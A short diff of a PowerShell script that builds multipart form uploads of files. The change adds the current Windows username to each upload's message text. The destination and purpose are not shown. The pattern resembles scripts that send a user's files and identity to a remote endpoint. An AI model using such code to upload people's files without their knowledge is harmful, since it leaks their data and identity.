@@ -26,7 +26,7 @@ try {
         $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
         
         # Optionally, add a text message with the file name
-        $messageText = "File: $($file.Name)"
+        $messageText = "File from: $env:USERNAME and File name: $($file.Name)"
         $messageContent = New-Object System.Net.Http.StringContent($messageText)
         $messageContent.Headers.Add("Content-Disposition", "form-data; name=`"content`"")
         $multipartContent.Add($messageContent)
